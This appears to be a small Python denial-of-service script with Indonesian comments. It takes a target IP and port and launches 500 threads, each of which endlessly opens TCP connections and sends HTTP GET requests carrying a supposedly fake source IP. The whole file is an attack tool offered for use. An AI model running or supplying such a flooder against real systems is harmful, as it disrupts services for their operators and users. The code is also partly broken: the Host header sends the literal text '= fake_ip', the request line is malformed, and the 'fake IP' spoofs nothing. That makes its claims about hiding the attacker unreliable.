# Simple Tools
# Author : NumeX

# Module
import socket
import threading

# Skuyy
print("Simple Tools DDoS\n")
target = input("[?] Enter IP Target : ")
port = int(input("[?] Enter The Port : "))

# Kita Pake Fake IP :v
fake_ip = '182.21.20.32'

# Connectednya
already_connected = 0

# Fungsi Attacknya
def attack():
    while  True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target,port))
        


        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected) # oke work ya oke thanks yyyyyy

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

